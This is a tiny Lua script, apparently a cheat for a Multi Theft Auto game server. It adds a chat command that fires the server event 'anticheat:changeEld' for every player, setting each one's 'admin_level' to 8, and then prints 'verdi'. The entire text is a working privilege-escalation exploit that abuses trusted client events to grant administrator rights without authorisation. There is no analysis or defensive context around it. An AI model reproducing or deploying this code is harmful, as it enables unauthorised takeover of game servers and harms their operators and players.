addCommandHandler("12", function()

for i,v in pairs(getElementsByType("player")) do 
triggerServerEvent("anticheat:changeEld", v, v, "admin_level", 8)
end

    outputChatBox("verdi")
end)
